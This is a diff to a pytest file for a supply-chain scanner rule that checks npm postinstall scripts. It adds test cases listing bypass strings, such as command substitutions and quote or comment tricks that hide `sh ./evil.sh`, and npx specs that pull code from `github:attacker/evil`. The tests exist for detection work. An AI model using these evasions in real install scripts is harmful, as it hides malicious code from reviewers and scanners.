@@ -127,6 +127,97 @@ def test_supply_003_passes_build_tools_and_declared_packages(tmp_path: Path, scr
     assert _supply_003(tmp_path, script, **deps) == []
 
 
+# These passed. Each runs a program off the safe list or has npx fetch a
+# package; every `sh ./evil.sh` here ran under `/bin/sh -c` on macOS (bash 3.2
+# as sh), and under dash too, but for the two ANSI-C (`$'...'`) strings. The
+# safe list was matched as a prefix of the command text, a command run after
+# an option-named package was never judged, a declared name was trusted
+# whatever source its spec named, a command that runs nothing was skipped with
+# its arguments, and a `#'` comment left an unclosed quote that made the line
+# fall back to whitespace splitting.
+_SUPPLY_003_BYPASSES = [
+    "NODE_ENV=production sh ./evil.sh",
+    "tsc && NODE_OPTIONS=x sh ./evil.sh",
+    "NODE_ENV=production",  # runs nothing, and passed only as a prefix of `node`
+    "tscripts/setup.sh",
+    "tsc && vite-installer --run",
+    "npm run build-and-setup",
+    'tsc && echo "$(sh ./evil.sh)"',
+    "tsc && echo `sh ./evil.sh`",
+    'tsc && : "$(sh ./evil.sh)"',
+    "tsc && echo \"it's $(sh ./evil.sh)\"",
+    "npx -p husky sh ./evil.sh",
+    "npm exec --package=husky -- sh ./evil.sh",
+    "npx -p husky npx -p husky sh ./evil.sh",
+    "npx husky@github:attacker/evil",
+    "npx husky@npm:evil-installer",
+    "npx --package=husky@github:attacker/evil husky",
+    "npx husky@latest",  # a tag can name a release the project does not install
+    "tsc&&sh ./evil.sh #'",
+    "node build.js;sh ./evil.sh #'",
+    "tsc && echo `echo #` && sh ./evil.sh",
+    'tsc && echo "a\n#b" && sh ./evil.sh',
+    "tsc && echo $'\\'' ; sh ./evil.sh ; echo '\\'",
+    "tsc && echo $'\\'' \"`sh ./evil.sh`\"",
+]
+
+
+@pytest.mark.parametrize("script", _SUPPLY_003_BYPASSES)
+def test_supply_003_reports_what_its_safe_list_let_through(tmp_path: Path, script: str) -> None:
+    assert _supply_003(tmp_path, script, devDependencies={"husky": "^9.0.0"}) == [f"scripts.postinstall: {script}"]
+
+
+@pytest.mark.parametrize("script", [
+    "npx -p husky husky install",  # the package's own command, as `npx husky install`
+    "npm exec --package=husky -- husky install",
+    "npx -p typescript tsc",
+    "npx husky@^9 install",  # a registry version of a declared package
+    "NODE_ENV=production webpack",
+    "PLAYWRIGHT_BROWSERS_PATH=0 npx playwright install chromium",
+    "node_modules/.bin/tsc -p .",
+    "npm run build -- --prod",
+    "node scripts/postinstall.mjs && echo 'done'",
+    "node $(echo build.js)",  # a substitution that runs nothing
+    "npx tsc --build && echo \"it's done\"",
+    "tsc # build the types",
+])
+def test_supply_003_passes_the_same_tools_read_by_name(tmp_path: Path, script: str) -> None:
+    deps = {"devDependencies": {"husky": "^9.0.0", "playwright": "^1.48.0", "typescript": "^5.6.0"}}
+    assert _supply_003(tmp_path, script, **deps) == []
+
+
+def test_supply_003_does_not_read_the_script_npm_run_build_runs(tmp_path: Path) -> None:
+    """Stated: following `npm run`, `yarn`, `pnpm` and `bun run` into the
+    scripts they name reported 238 more of 3,171 real install scripts and 42
+    fewer; 234 of the 238 were `npm run build` whose script runs a build tool
+    off the safe list (`rimraf dist && tsc`). So the script is not read, as the
+    file `node build.js` runs is not."""
+    package = {"scripts": {"postinstall": "npm run build", "build": "sh ./evil.sh"}}
+    (tmp_path / "package.json").write_text(json.dumps(package))
+    assert [f for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-003"] == []
+
+
+@pytest.mark.parametrize("script", [
+    "tsc && echo " + "$(" * 2_040,
+    "tsc && echo " + "`" * 4_080,
+    "tsc && echo " + "\"$(echo '" * 290,
+    "tsc && echo " + "$'\\" * 1_020,
+    "tsc && " + "# '" * 1_360,
+    "tsc && echo " + "x" * 4_080,
+    "npx -p husky " * 314 + "tsc",
+])
+def test_a_crafted_script_at_the_limit_is_judged_quickly(tmp_path: Path, script: str) -> None:
+    """Every script judged is at most 4,096 characters, so reading its comments,
+    quotes and nested substitutions is bounded; this checks the bound holds for
+    the shapes that make those readers work hardest."""
+    import time
+
+    assert len(script) <= 4_096
+    started = time.process_time()
+    _supply_003(tmp_path, script)
+    assert time.process_time() - started < 1.0
+
+
 def test_supply_003_still_reports_a_command_off_the_safe_list(tmp_path: Path) -> None:
     """Declaring a package makes npx run it locally; the bare command was, and
     is, judged by the build-tool list alone."""
@@ -135,8 +226,8 @@ def test_supply_003_still_reports_a_command_off_the_safe_list(tmp_path: Path) ->
 
 def test_supply_003_reports_a_script_too_long_to_judge(tmp_path: Path) -> None:
     """The longest of 3,171 real install scripts was 578 characters. A script
-    over the limit is reported without being split, so a crafted one costs the
-    scan nothing: shell tokenizing a single long word grows with its square."""
+    over the limit is reported without being split, which bounds what a crafted
+    one costs the scan."""
     import time
 
     script = "tsc " + "a" * 2_000_000
